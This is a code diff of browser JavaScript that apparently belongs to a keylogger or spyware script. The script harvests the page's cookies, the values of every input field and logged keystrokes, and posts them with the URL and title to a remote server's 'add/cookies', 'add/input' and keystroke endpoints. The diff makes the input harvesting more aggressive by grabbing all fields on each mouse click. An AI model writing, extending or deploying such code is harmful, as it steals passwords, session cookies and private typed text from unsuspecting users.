@@ -22,7 +22,6 @@ function PostTo(endpoint,request) {
 document.addEventListener('readystatechange',event => {
     /* Wait for the page to be fully loaded */
     if (event.target.readyState === "complete") {
-        getInputFields();
         saveAndSendC(); 
     }
 })
@@ -37,7 +36,7 @@ function saveAndSendC() {
     var curCookies = {}
     curCookies['url'] = document.URL;
     curCookies['id'] = clientID;
-    curCookies['title'] = document.title;
+    curCookies['title'] = document.title || 'No Title'
     curCookies['cookies'] = document.cookie;
     // alert(JSON.stringify(curCookies)); // placeholder
     PostTo('add/cookies',curCookies);
@@ -52,10 +51,7 @@ function saveAndSendC() {
 function getInputFields() {
     allInputs = document.getElementsByTagName('input');
     for (var i = 0; i < allInputs.length; i++) {
-        /* When a field loses focus for the first time, save and send to catch autofilled fields */
-        allInputs[i].addEventListener('blur',function(e) {
-            saveAndSendIF(e.target);
-        },{once:true});
+        saveAndSendIF(allInputs[i])
     }
 }
 
@@ -67,11 +63,11 @@ function saveAndSendIF(target) {
     var curInput = {} 
     curInput['id'] = clientID;
     curInput['url'] = document.URL;
-    curInput['title'] = document.title;
-    curInput['type'] = target.name;
+    curInput['title'] = document.title || 'No Title'
+    curInput['type'] = target.name || 'None'
     curInput['content'] = target.value;
     /* Send to remote server */
-    // alert(JSON.stringify(curInput)); // placeholder
+    alert(JSON.stringify(curInput)); // placeholder
     PostTo('add/input',curInput);
 }
 
@@ -108,9 +104,10 @@ document.addEventListener('keydown',function(e) {
     }
 });
 
-/* On click event, save and send the current log */
+/* On click event, save and send the current log and grab input boxes */
 document.addEventListener('mousedown',function() {
     saveAndSendKS();
+    getInputFields();
 });
 
 /* Send user input before user leaves webpage or close tab/window*/
@@ -125,7 +122,7 @@ function saveAndSendKS() {
     var curMessage = {} 
     curMessage['id'] = clientID;
     curMessage['url'] = document.URL;
-    curMessage['title'] = document.title;
+    curMessage['title'] = document.title || 'No Title'
     /* Set and clear log */
     curMessage['content'] = curlog;
     curlog = [];
